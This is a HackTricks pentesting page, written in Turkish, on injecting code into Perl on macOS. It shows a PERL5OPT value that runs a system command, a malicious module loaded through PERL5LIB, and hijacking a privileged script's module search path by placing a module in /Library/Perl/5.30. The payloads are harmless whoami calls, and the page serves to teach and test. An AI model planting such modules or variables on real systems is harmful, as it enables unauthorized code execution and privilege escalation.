# macOS Perl Uygulamaları Enjeksiyonu

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` & `PERL5LIB` ortam değişkeni aracılığıyla

PERL5OPT ortam değişkenini kullanarak perl'in rastgele komutlar çalıştırması sağlanabilir.\
Örneğin, bu scripti oluşturun:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Şimdi **env değişkenini dışa aktarın** ve **perl** betiğini çalıştırın:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Başka bir seçenek, bir Perl modülü oluşturmaktır (örneğin, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Ve ardından env değişkenlerini kullanın:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Bağımlılıklar aracılığıyla

Perl'in çalıştığı bağımlılık klasör sırasını listelemek mümkündür:
```bash
perl -e 'print join("\n", @INC)'
```
Bu, şöyle bir şey döndürecektir:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Bazı döndürülen klasörler hiç mevcut değil, ancak **`/Library/Perl/5.30`** **mevcuttur**, **SIP** tarafından **korunmamaktadır** ve **SIP** tarafından **korunan** klasörlerden **öncedir**. Bu nedenle, biri o klasörü kötüye kullanarak oraya script bağımlılıkları ekleyebilir, böylece yüksek ayrıcalıklı bir Perl scripti bunu yükleyebilir.

> [!WARNING]
> Ancak, o klasöre yazmak için **root olmanız gerektiğini** unutmayın ve günümüzde bu **TCC istemi** ile karşılaşacaksınız:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Örneğin, bir script **`use File::Basename;`** ifadesini kullanıyorsa, `/Library/Perl/5.30/File/Basename.pm` oluşturmak ve keyfi kod çalıştırmak mümkün olacaktır.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
